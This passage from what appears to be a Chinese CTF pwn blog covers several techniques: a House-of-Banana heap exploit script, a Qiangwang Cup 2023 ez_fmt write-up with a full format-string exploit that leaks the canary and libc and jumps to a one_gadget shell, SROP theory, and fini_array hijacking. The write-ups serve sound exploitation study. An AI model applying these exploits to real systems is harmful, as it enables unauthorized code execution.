class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  io.sendlineafter(<span class="hljs-string">&quot;Size:\n&quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  io.sendafter(<span class="hljs-string">&quot;context: \n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>  io.sendlineafter(<span class="hljs-string">&#x27;index:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>() :<br>  add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>  add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>  add(<span class="hljs-number">2</span>,<span class="hljs-number">0x418</span>)<br>  free(<span class="hljs-number">0</span>)<br>  add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>  show(<span class="hljs-number">0</span>)<br>  io.recvuntil(<span class="hljs-string">&#x27;context: \n&#x27;</span>)<br>  libc_base=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ec090</span><br><br>  edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>  show(<span class="hljs-number">0</span>)<br>  io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>  heap_base=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x250</span><br> <br>  rtld_global=libc_base+<span class="hljs-number">0x62a060</span><br>  link_map3=libc_base + <span class="hljs-number">0x168fb8</span> <span class="hljs-comment">##需要爆破</span><br>  one_gadget=libc_base + <span class="hljs-number">0x4f302</span><br><br><br>  free(<span class="hljs-number">2</span>)<br>  edit(<span class="hljs-number">0</span>,p64(libc_base+<span class="hljs-number">0x3ec090</span>)*<span class="hljs-number">2</span>+p64(heap_base+<span class="hljs-number">0x250</span>)+p64(link_map3-<span class="hljs-number">0x20</span>))<br>  add(<span class="hljs-number">4</span>,<span class="hljs-number">0x500</span>)<br><br>  fake_addr=heap_base+<span class="hljs-number">0xb90</span><br>  payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(fake_addr)<br>  payload = payload.ljust(<span class="hljs-number">0x48</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x58</span>)+p64(<span class="hljs-number">8</span>)+p64(one_gadget)<br>  payload = payload.ljust(<span class="hljs-number">0x110</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x40</span>)<br>  payload = payload.ljust(<span class="hljs-number">0x120</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(fake_addr+<span class="hljs-number">0x48</span>)<br>  payload = payload.ljust(<span class="hljs-number">0x314</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">0x1c</span>)<br><br>  edit(<span class="hljs-number">2</span>,payload)<br>  io.sendlineafter(<span class="hljs-string">&#x27;Your choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>  io.interactive()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>  io = process(filename)<br>  <span class="hljs-keyword">try</span> :<br>    pwn()<br>    <span class="hljs-keyword">break</span><br>  <span class="hljs-keyword">except</span> :<br>    <span class="hljs-keyword">continue</span><br>  <span class="hljs-keyword">finally</span> :<br>    io.close()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Banana</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2023_ezfmt复现</title>
    <link href="/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="2023强网杯ez-fmt"><a href="#2023强网杯ez-fmt" class="headerlink" title="2023强网杯ez_fmt"></a><strong>2023强网杯ez_fmt</strong></h2><p>序言：明天要打强网杯了，特意找了一点以前的题写写，发现这高质量比赛的题真是开阔视野了，收获不少。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>IDA反编译一下看一下伪代码，第一眼看上去真是简单题呀，但是以开始写脚本发现十分的不对劲，只有一个格式化字符串漏洞，而且利用过后不能通过fini_array实现无限利用。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012029275.png" alt="image-20241101202921204"></p><p>思考很久都没有思路，上网查看了大佬的wp才恍然大悟。也彻底颠覆了我对控制函数返回地址的理解。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012036093.png" alt="image-20241101203607009"></p><p>题目首先给了个buf的地址，通过调试发现，printf的返回地址就是buf-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012038797.png" alt="image-20241101203800712"></p><p>这时候我们就可以通过格式化字符串来控制buf-0x8的内容，实现printf函数后直接跳转到read函数，而不是执行w &#x3D; 0，这样我们就可以实现多次格式化字符串利用了。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012041634.png" alt="image-20241101204124552"></p><p>可以看到我们已经把返回地址改为0x401205，这样就会执行完printf函数直接又执行read函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012042572.png" alt="image-20241101204259525"></p><p>所以我们的攻击思路为</p><ol><li>通过格式化字符串修改printf函数的返回地址，并且泄露libc基地址</li><li>通过格式化字符串修改main函数的返回地址为one_gadget</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>题目能泄露地址不要总想着通过main函数控制执行流，有时候通过其他函数才能化繁为简。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./ez_fmt&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * 0x000000000040121B</span><br><span class="hljs-string">    b * 0x0000000000401239</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;gift for you &#x27;</span>)<br>buf_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span> , drop = <span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;buf_addr&#x27;</span>)<br>read_ret = buf_addr - <span class="hljs-number">0x8</span><br>payload = <span class="hljs-string">b&#x27;%5c%9$hhn%17$p%19$p&#x27;</span>.ljust(<span class="hljs-number">0x18</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload += p64(read_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br>p.recv(<span class="hljs-number">5</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;canary&#x27;</span>)<br>__libc_start_call_main = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>) , <span class="hljs-number">16</span>) - <span class="hljs-number">243</span><br>lss(<span class="hljs-string">&#x27;__libc_start_call_main&#x27;</span>)<br>base_addr = __libc_start_call_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;base_addr&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0xe3afe</span> , <span class="hljs-number">0xe3b01</span> , <span class="hljs-number">0xe3b04</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">1</span>]<br>mian_ret = buf_addr + <span class="hljs-number">0x68</span><br>lss(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>bit1 = (execve &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>bit2 = execve &amp; <span class="hljs-number">0xffff</span><br>lss(<span class="hljs-string">&#x27;bit1&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;bit2&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit1).encode() + <span class="hljs-string">b&#x27;c%10$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit2 - bit1).encode() + <span class="hljs-string">b&#x27;c%11$hn&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload = payload.ljust(<span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(mian_ret + <span class="hljs-number">2</span>) + p64(mian_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>强网杯2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高级ROP之SROP</title>
    <link href="/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/"/>
    <url>/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/</url>
    
    <content type="html"><![CDATA[<h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410281958887.png" alt="Process of Signal Handlering"></p><ol><li><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p></li><li><p>进入内核前为了恢复进程需要保存上下文，<strong>主要是把所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282005729.png" alt="sdf"></p></li><li><p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p></li></ol><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><p>说到这里，其实，SROP 的基本利用原理也就出现了。</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h3><p>我们需要在Signal Frame中控制寄存器信息，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rax</span> <span class="hljs-number">59</span><br><span class="hljs-built_in">rdi</span> = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rdx</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rip</span> = <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282039291.png" alt="signal2-stack"></p>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于fini_array的巧妙利用</title>
    <link href="/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"/>
    <url>/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="文件启动之ELF"><a href="#文件启动之ELF" class="headerlink" title="文件启动之ELF"></a>文件启动之ELF</h2><p>经常调试的朋友都知道，main函数其实不是程序的起点。程序的启动流程依次为</p><p><code>_start --&gt; __libc_start_main --&gt; main</code></p><h2 id="libc-start-main分析"><a href="#libc-start-main分析" class="headerlink" title="__libc_start_main分析"></a>__libc_start_main分析</h2><p>对应<code>_start</code>的代码，可以发现<code>__libc_start_main</code>函数的参数中，有3个是函数指针：</p><ul><li><code>rdi</code> &lt;- <code>main</code></li><li><code>rcx</code> &lt;- <code>__libc_csu_init</code></li><li><code>r8</code> &lt;- <code>__libc_csu_fini</code></li></ul><p>不难想到，除<code>main</code>以外的这两位兄弟，一位在<code>main</code>开始执行前执行，一位在<code>main</code>执行完毕后执行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/20i <span class="hljs-number">0x402bd0</span><br>   <span class="hljs-number">0x402bd0</span> &lt;__libc_csu_fini&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402bd1</span> &lt;__libc_csu_fini+<span class="hljs-number">1</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xb24e8</span>]        # <span class="hljs-number">0x4b50c0</span> <br>   <span class="hljs-number">0x402bd8</span> &lt;__libc_csu_fini+<span class="hljs-number">8</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rbp</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xb24d1</span>]        # <span class="hljs-number">0x4b50b0</span> <br>   <span class="hljs-number">0x402bdf</span> &lt;__libc_csu_fini+<span class="hljs-number">15</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0x402be0</span> &lt;__libc_csu_fini+<span class="hljs-number">16</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402be3</span> &lt;__libc_csu_fini+<span class="hljs-number">19</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x402be7</span> &lt;__libc_csu_fini+<span class="hljs-number">23</span>&gt;:<span class="hljs-keyword">sar</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x3</span><br>   <span class="hljs-number">0x402beb</span> &lt;__libc_csu_fini+<span class="hljs-number">27</span>&gt;:<span class="hljs-keyword">je</span>     <span class="hljs-number">0x402c06</span> &lt;__libc_csu_fini+<span class="hljs-number">54</span>&gt;<br>   <span class="hljs-number">0x402bed</span> &lt;__libc_csu_fini+<span class="hljs-number">29</span>&gt;:<span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rbx</span>,[<span class="hljs-built_in">rax</span>-<span class="hljs-number">0x1</span>]<br>   <span class="hljs-number">0x402bf1</span> &lt;__libc_csu_fini+<span class="hljs-number">33</span>&gt;:<span class="hljs-keyword">nop</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x0</span>]<br>   <span class="hljs-number">0x402bf8</span> &lt;__libc_csu_fini+<span class="hljs-number">40</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rbx</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x0</span>]<br>   <span class="hljs-number">0x402bfc</span> &lt;__libc_csu_fini+<span class="hljs-number">44</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-number">0x1</span><br>   <span class="hljs-number">0x402c00</span> &lt;__libc_csu_fini+<span class="hljs-number">48</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x402c04</span> &lt;__libc_csu_fini+<span class="hljs-number">52</span>&gt;:<span class="hljs-keyword">jne</span>    <span class="hljs-number">0x402bf8</span> &lt;__libc_csu_fini+<span class="hljs-number">40</span>&gt;<br>   <span class="hljs-number">0x402c06</span> &lt;__libc_csu_fini+<span class="hljs-number">54</span>&gt;:<span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x8</span><br>   <span class="hljs-number">0x402c0a</span> &lt;__libc_csu_fini+<span class="hljs-number">58</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rbx</span><br>   <span class="hljs-number">0x402c0b</span> &lt;__libc_csu_fini+<span class="hljs-number">59</span>&gt;:<span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rbp</span><br>   <span class="hljs-number">0x402c0c</span> &lt;__libc_csu_fini+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x48f52c</span> &lt;_fini&gt;<br></code></pre></td></tr></table></figure><h3 id="利用方式-栈迁移"><a href="#利用方式-栈迁移" class="headerlink" title="利用方式 - 栈迁移"></a>利用方式 - 栈迁移</h3><p>首先，看下面这条指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x402bd8</span>: lea rbp,[rip+<span class="hljs-number">0xb24d1</span>] # <span class="hljs-number">0x4b50b0</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><code>rbp = 0x4b50b0</code>，<code>0x4b50b0</code>是<code>fini_array</code>的首地址</p></blockquote><p>这条指令相当于<code>lea rbp,[fini_array]</code>，因此，在这里配合<code>gadget</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">leave ; (mov rsp,ebp; pop rbp)<br>ret<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>便可以把__栈迁移__到<code>fini_array</code>（<code>fini_array</code>存储的函数指针，可能有__写权限__）</p><h3 id="利用方式-控制流劫持"><a href="#利用方式-控制流劫持" class="headerlink" title="利用方式 - 控制流劫持"></a>利用方式 - 控制流劫持</h3><p>下面还有一条<code>call</code>指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x402bf8</span>: call QWORD PTR [rbp+rbx*<span class="hljs-number">8</span>]<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><code>rbp</code>即为<code>fini_array</code>，因此这里将调用<code>fini_array</code>中的函数</p></blockquote><p>只要修改<code>fini_array</code>中的值，就可以实现__控制流的转移__啦（传说中的<code>fini_array</code>劫持）</p><p>这里分析的64位的静态编译程序，可见其中的<code>__libc_csu_fini</code>函数简直好用的不得了鸭，既可以完成__栈迁移__，又能够劫持__控制流__</p><blockquote><p>动态链接的程序<code>__libc_csu_fini</code>很短，并没有上述指令…但是也有类似fini_array的函数指针</p></blockquote><h2 id="fini-array分析"><a href="#fini-array分析" class="headerlink" title="fini_array分析"></a>fini_array分析</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; elfheader <br><span class="hljs-number">0x400200</span> - <span class="hljs-number">0x400224</span>  .note<span class="hljs-number">.</span>gnu<span class="hljs-number">.</span>build-id<br><span class="hljs-number">0x400224</span> - <span class="hljs-number">0x400244</span>  .note<span class="hljs-number">.</span>ABI-tag<br><span class="hljs-number">0x400248</span> - <span class="hljs-number">0x400470</span>  .rela<span class="hljs-number">.</span>plt<br><span class="hljs-number">0x401000</span> - <span class="hljs-number">0x401017</span>  .init<br><span class="hljs-number">0x401018</span> - <span class="hljs-number">0x4010d0</span>  .plt<br><span class="hljs-number">0x4010d0</span> - <span class="hljs-number">0x48d630</span>  .text<br><span class="hljs-number">0x48d630</span> - <span class="hljs-number">0x48f52b</span>  __libc_freeres_fn<br><span class="hljs-number">0x48f52c</span> - <span class="hljs-number">0x48f535</span>  .fini<br><span class="hljs-number">0x490000</span> - <span class="hljs-number">0x4a95dc</span>  .rodata<br><span class="hljs-number">0x4a95dc</span> - <span class="hljs-number">0x4a95dd</span>  .stapsdt<span class="hljs-number">.</span>base<br><span class="hljs-number">0x4a95e0</span> - <span class="hljs-number">0x4b3d00</span>  .eh_frame<br><span class="hljs-number">0x4b3d00</span> - <span class="hljs-number">0x4b3da9</span>  .gcc_except_table<br><span class="hljs-number">0x4b5080</span> - <span class="hljs-number">0x4b50a0</span>  .tdata<br><span class="hljs-number">0x4b50a0</span> - <span class="hljs-number">0x4b50b0</span>  .init_array<br><span class="hljs-number">0x4b50a0</span> - <span class="hljs-number">0x4b50e0</span>  .tbss<br><span class="hljs-number">0x4b50b0</span> - <span class="hljs-number">0x4b50c0</span>  .fini_array<br><span class="hljs-number">0x4b50c0</span> - <span class="hljs-number">0x4b7ef4</span>  .data<span class="hljs-number">.</span><span class="hljs-built_in">rel</span><span class="hljs-number">.</span>ro<br><span class="hljs-number">0x4b7ef8</span> - <span class="hljs-number">0x4b7fe8</span>  .got<br><span class="hljs-number">0x4b8000</span> - <span class="hljs-number">0x4b80d0</span>  .got<span class="hljs-number">.</span>plt<br><span class="hljs-number">0x4b80e0</span> - <span class="hljs-number">0x4b9bf0</span>  .data<br><span class="hljs-number">0x4b9bf0</span> - <span class="hljs-number">0x4b9c38</span>  __libc_subfreeres<br><span class="hljs-number">0x4b9c40</span> - <span 